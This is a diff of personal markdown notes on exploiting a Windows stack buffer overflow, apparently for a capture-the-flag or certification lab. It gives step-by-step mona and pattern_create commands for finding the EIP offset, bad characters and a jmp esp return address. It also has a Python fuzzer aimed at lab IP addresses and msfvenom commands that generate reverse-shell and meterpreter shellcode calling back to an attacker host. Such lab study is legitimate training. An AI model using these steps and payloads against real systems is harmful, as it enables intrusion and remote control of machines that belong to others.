@@ -9,28 +9,64 @@
 If .exe windows machine
 
 ## Methods
-1. Connect to target: **nc 10.10.9.228 1337**
-2. Define local folder for mona: **!mona config -set workingfolder c:\Users\admin\Desktop\patota**
-3. Send characters to find offsed: **python3 fuzzer.py**
-  - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ###
-   - exploit
+1. Connect to target: **nc TARGET PORT**
+2. Define local folder for mona: 
+  
+```
+!mona config -set workingfolder c:\Users\admin\Desktop\patota
+```
 
-4. Find offset: !mona findmsp -distance DISTANCE == Find Offset EIP
-4. Fider ofsset 2: /usr/bin/msf-pattern_offset -l DISTANCE -q EIP Register
-5. Set new return after offset: **retn = BBBB**
-6. Set list o chars excluding badhchar: **!mona bytearray -b "\x00"**
+1. Send characters to find offset: 
+   1. Fuzzer script
+   2. Manually:
+  ```
+  python -c 'print"A" * 1000'
+  ```
+**With Fuzzer**
+1. Find offset: !mona findmsp -distance DISTANCE == Find Offset EIP
 
-7. Find next bad chars: **!mona compare -f C:\Users\admin\Desktop\patota\bytearray.bin -a ESP**
+**WITHOUT Fuzzer**
+4. Generate a pattern with the length that crashed and send it
+   
+```
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [length]
+```
 
-8. Find ESP address after eliminating bad chars: **!mona jmp -r esp -cpb "\x00\x01"**
-
-9. New return address is the **jmp** found.
-retn = jmp
-
-10. Generate reverse shells:
+5. Send payload exploit.py with pattern
+6. Find memory at which crashed
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 EXITFUNC=thread -b "BAD_CHARS" -f c
+!mona findmsp -distance [length]
+Response: EIP contains normal pattern : 0x39654138 (offset xxxxx)
+
+```
+7. Remove payload from the script, and add BBBB to *retn*
+8. !mona bytearray -b "\x00" ==> find bad arrays
+9. Generate string without bad chars. Script_Strings
+10.  Add those strings in the payload exploit.py
+11.  Find address to which the ESP register points:
+  
+```
+!mona compare -f c:\Users\admin\Desktop\patota\bytearray.bin  -a ESP-Address
+
+```
+12. Remove bad chars from exploit.py
+13. Find return address (jmp esp):
+```
+!mona jmp -r esp -cpb "Badchars"
+```
+14. Take note of one of the address and write it backwards:
+
+```
+080416BF
+"\xBF\x16\x04\x08"
+```
+
+15. Add padding to the payload: "\x90" * 16
+
+16. Generate shell code removing bad chars
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4445 EXITFUNC=thread -b "\x00\x0a" -f c
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.1.255 LPORT=4444 -f rb -b "BAD_CHARS" -f c
 
@@ -159,7 +195,8 @@ proc.send(payload)
 proc.interactive()
 ```
 
-## Script Fuzzer
+## Fuzzers
+1. Not working
 ```
 #!/usr/bin/env python3
 
@@ -189,11 +226,32 @@ while True:
   time.sleep(1)
 ```
 
-```
+2. not working
 
 ```
+#!/usr/bin/python3
+import sys
+import socket
+from time import sleep
 
-## Script Strings
+buffer = b"A" * 100
+
+while True:
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect(('10.10.185.214', 31337))
+        payload = buffer
+        sock.send(payload)
+        sock.close()
+        sleep(1)
+        buffer += b"A" * 100
+        print("Sending %s bytes" % str(len(buffer)))
+    except:
+        print("Fuzzing crash at %s bytes" % str(len(buffer)))
+        sys.exit()
+```
+
+## Script_Strings
 ```
 #listRem = "\\x11".split("\\x")
 #
@@ -205,7 +263,7 @@ print()
 
 ```
 
-## Exploit
+## Script to find EIP
 ```
 import socket
 
